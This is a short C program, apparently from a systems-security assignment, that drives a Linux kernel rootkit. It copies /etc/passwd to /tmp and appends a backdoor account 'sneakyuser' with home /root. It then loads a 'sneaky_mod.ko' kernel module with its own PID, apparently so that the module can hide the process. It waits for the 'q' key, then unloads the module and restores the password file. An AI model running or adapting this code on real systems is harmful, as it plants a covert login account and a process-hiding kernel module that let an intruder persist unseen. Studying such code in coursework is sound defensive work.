#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    // Step 1. print pid
    printf("sneaky_process pid = %d\n", getpid());
    // Step 2.1 copy /etc/passwd file to /tmp
    system("cp /etc/passwd /tmp");
    // Step 2.2 add a new line to source file
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
    // Step 3. load sneaky module
    char load_command[50];
    sprintf(load_command, "insmod sneaky_mod.ko pid_str=%d", (int)getpid());
    system(load_command);
    // Step 4. read from keyboard until receive a 'q'
    char my_read_char;
    do {
        my_read_char = fgetc(stdin);
        if (my_read_char == 'q') {
            break;
        }
    } while (1);
    // Step 5. Unload sneaky module
    system("rmmod sneaky_mod.ko");
    // Step 6. Copy /tmp/passwd to /etc/passwd
    system("cp /tmp/passwd /etc");
    // Recover to original, for testing. Delete before submitting
    system("rm /tmp/passwd");
    return EXIT_SUCCESS;
}